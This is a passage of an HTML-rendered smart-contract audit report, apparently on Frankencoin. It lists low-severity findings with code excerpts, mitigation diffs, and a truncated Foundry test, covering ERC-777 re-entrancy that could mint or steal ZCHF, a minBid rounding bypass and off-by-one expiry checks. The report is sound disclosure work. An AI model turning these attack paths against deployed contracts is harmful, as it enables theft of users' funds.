class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">expiration</span><span class=\"mtk1\">){</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Position.sol#L299-L305\">Link to code</a></p>\n<h3 id=\"recommended-mitigation-steps-21\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-21\" aria-label=\"recommended mitigation steps 21 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>For code consistency, and to prevent any possible issues with the exact block of expiration:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"42\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">-    </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">expiration</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Expired</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+    </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">expiration</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Expired</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<h2 id=\"l-05-no-pause-mechanism-in-case-of-depeg-of-xchf-token\" style=\"position:relative;\"><a href=\"#l-05-no-pause-mechanism-in-case-of-depeg-of-xchf-token\" aria-label=\"l 05 no pause mechanism in case of depeg of xchf token permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-05] No pause mechanism in case of depeg of XCHF token</h2>\n<p>The system allows minting 1-1 FrankenCoin with the same amount of XCHF tokens. In the case the stable coin XCHF depegs from its value it will greatly affect the value of the FrankenCoin ZCHF token, as they can be redeemed immediately.</p>\n<h3 id=\"recommended-mitigation-steps-22\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-22\" aria-label=\"recommended mitigation steps 22 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>It should be up for consideration the implementation of a pause function on the StablecoinBridge to prevent minting tokens 1-1 in case of emergency.</p>\n<h2 id=\"l-06-tokens-with-very-large-decimals-will-not-work-as-expected\" style=\"position:relative;\"><a href=\"#l-06-tokens-with-very-large-decimals-will-not-work-as-expected\" aria-label=\"l 06 tokens with very large decimals will not work as expected permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-06] Tokens with very large decimals will not work as expected</h2>\n<p>Although not common, it is possible that ERC-20 tokens have <code>decimals() > 36</code>. The current system acknowledges it, but does not prevent anyone from creating a position with them. This will result in the token not working as expected.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"43\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     * @</span><span class=\"mtk12\">param</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_liqPrice</span><span class=\"mtk1\">          </span><span class=\"mtk12\">Liquidation</span><span class=\"mtk1\"> </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> </span><span class=\"mtk15\">with</span><span class=\"mtk1\"> (</span><span class=\"mtk7\">36</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> </span><span class=\"mtk12\">decimals</span><span class=\"mtk1\">) </span><span class=\"mtk12\">decimals</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     *                           </span><span class=\"mtk12\">e</span><span class=\"mtk1\">.</span><span class=\"mtk12\">g</span><span class=\"mtk1\">. </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> </span><span class=\"mtk12\">decimals</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">an</span><span class=\"mtk1\"> </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> </span><span class=\"mtk12\">decimal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">, </span><span class=\"mtk7\">36</span><span class=\"mtk1\"> </span><span class=\"mtk12\">decimals</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">a</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> </span><span class=\"mtk12\">decimal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/MintingHub.sol#L83-L84\">Link to code</a></p>\n<h3 id=\"recommended-mitigation-steps-23\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-23\" aria-label=\"recommended mitigation steps 23 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Validate that tokens have &#x3C; than 36 decimals or the desired value</p>\n<h2 id=\"l-07-minbid-can-be-bypassed-to-bid-indefinitely-for-small-amounts\" style=\"position:relative;\"><a href=\"#l-07-minbid-can-be-bypassed-to-bid-indefinitely-for-small-amounts\" aria-label=\"l 07 minbid can be bypassed to bid indefinitely for small amounts permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-07] minBid can be bypassed to bid indefinitely for small amounts</h2>\n<p><code>MintingHub::minBid()</code> returns the same number as the <code>challenge.bid</code> for small numbers:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"44\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">minBid</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Challenge</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bid</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1005</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>For <code>challenge.bid &#x3C;= 199</code>, the result of <code>minBid</code> is the same as the bid because of the precision loss error.</p>\n<p><code>minBid</code> is used in the <code>bid</code> function to check if the bid should be postponed:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"45\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_bidAmountZCHF</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk11\">minBid</span><span class=\"mtk1\">(</span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">BidTooLow</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_bidAmountZCHF</span><span class=\"mtk1\">, </span><span class=\"mtk11\">minBid</span><span class=\"mtk1\">(</span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">// @audit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">earliestEnd</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">30</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minutes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">earliestEnd</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// bump remaining time like ebay does when last minute bids come in</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// An attacker trying to postpone the challenge forever must increase the bid by 0.5%</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// every 30 minutes, or double it every three days, making the attack hard to sustain</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// for a prolonged period of time.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">earliestEnd</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-24\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-24\" aria-label=\"recommended mitigation steps 24 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Replace the <code>&#x3C;</code> with <code>&#x3C;=</code>. That way it will revert when the amounts are low enough to return the same number.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"46\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">-    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_bidAmountZCHF</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk11\">minBid</span><span class=\"mtk1\">(</span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">BidTooLow</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_bidAmountZCHF</span><span class=\"mtk1\">, </span><span class=\"mtk11\">minBid</span><span class=\"mtk1\">(</span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_bidAmountZCHF</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk11\">minBid</span><span class=\"mtk1\">(</span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">BidTooLow</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_bidAmountZCHF</span><span class=\"mtk1\">, </span><span class=\"mtk11\">minBid</span><span class=\"mtk1\">(</span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<h2 id=\"l-08-erc-777-tokens-can-lead-to-re-entrancy-vulnerabilities\" style=\"position:relative;\"><a href=\"#l-08-erc-777-tokens-can-lead-to-re-entrancy-vulnerabilities\" aria-label=\"l 08 erc 777 tokens can lead to re entrancy vulnerabilities permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-08] ERC-777 tokens can lead to re-entrancy vulnerabilities</h2>\n<p>ERC-777 behave like ERC-20 tokens, but they make a callback when tokens are transfered.</p>\n<h3 id=\"impact-7\" style=\"position:relative;\"><a href=\"#impact-7\" aria-label=\"impact 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Positions containing ERC-777 tokens as collateral may be victim of re-entrancy attacks.</p>\n<p>The possible impacts are unrestricted minting of ZCHF tokens via <code>end</code>, and stealing ZCHF tokens from the <code>MintingHub</code>, both critical.</p>\n<p>On top of that, some inconsistency on the positions’ storage can be result of these unexpected behavior.</p>\n<p>The actual impact relies on the <code>minters</code> of the protocol allowing the possibility of using ERC-777 tokens as collateral or denying them.</p>\n<h3 id=\"proof-of-concept-18\" style=\"position:relative;\"><a href=\"#proof-of-concept-18\" aria-label=\"proof of concept 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>These functions in the <code>MintingHub</code> are suceptible to re-entrancy attacks. An attacker can perform them by first launching a challenge, and then calling the respected functions. As the bidder and challenger will be the same, the collateral will be transfered between attacker accounts.</p>\n<p><code>end()</code> calls <code>returnCollateral</code> early on the function, before the <code>challenge</code> is deleted. So, it can be re-entered to mint extra tokens via <code>zchf.notifyLoss</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"47\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// returnCollateral()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">.</span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk11\">collateral</span><span class=\"mtk1\">().</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">.</span><span class=\"mtk12\">size</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/MintingHub.sol#L211\">Link to code</a></p>\n<p><code>bid()</code> can be re-entered when the bid is high enough to avert the challenge.</p>\n<p>First, the attacker needs to have a previous bid, or the attacker can create one.</p>\n<p>The attacker would then be able to steal the initial bid multiple times via the <code>zchf.transfer(challenge.bidder, challenge.bid);</code>. Assets will be taken from the <code>MintingHub</code> contract.</p>\n<p>The re-entrancy can be executed by calling the function with a value big enough to avert the challenge:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"48\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// bid()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">.</span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk11\">collateral</span><span class=\"mtk1\">().</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">.</span><span class=\"mtk12\">challenger</span><span class=\"mtk1\">, </span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">.</span><span class=\"mtk12\">size</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// return the challenger&#39;s collateral</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/MintingHub.sol#L294\">Link to code</a></p>\n<h3 id=\"recommended-mitigation-steps-25\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-25\" aria-label=\"recommended mitigation steps 25 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add re-entrancy guards to functions that transfer collateral, and implement the Checks-Effects-Interaction pattern. Or disallow the use of ERC-777 tokens as collateral.</p>\n<p><a href=\"https://github.com/Frankencoin-ZCHF/FrankenCoin/blob/main/contracts/MintingHub.sol#L88-L113\">Link to code</a></p>\n<h2 id=\"l-09-challenges-can-be-split-after-they-end\" style=\"position:relative;\"><a href=\"#l-09-challenges-can-be-split-after-they-end\" aria-label=\"l 09 challenges can be split after they end permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-09] Challenges can be split after they end</h2>\n<h3 id=\"impact-8\" style=\"position:relative;\"><a href=\"#impact-8\" aria-label=\"impact 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Griefing users by diving their already ended challenges</p>\n<h3 id=\"proof-of-concept-19\" style=\"position:relative;\"><a href=\"#proof-of-concept-19\" aria-label=\"proof of concept 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"49\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testBidAfterEnd</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Position</span><span class=\"mtk1\"> </span><span class=\"mtk12\">position</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">Position</span><span class=\"mtk1\">(</span><span class=\"mtk11\">initPosition</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">skip</span><span class=\"mtk1\">(</span><span class=\"mtk7\">7</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">86_400</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">60</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">User</span><span class=\"mtk1\"> </span><span class=\"mtk12\">challenger</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">User</span><span class=\"mtk1\">(</span><span class=\"mtk12\">zchf</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">col</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">challenger</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1001</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">challengeNumber</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">challenger</span><span 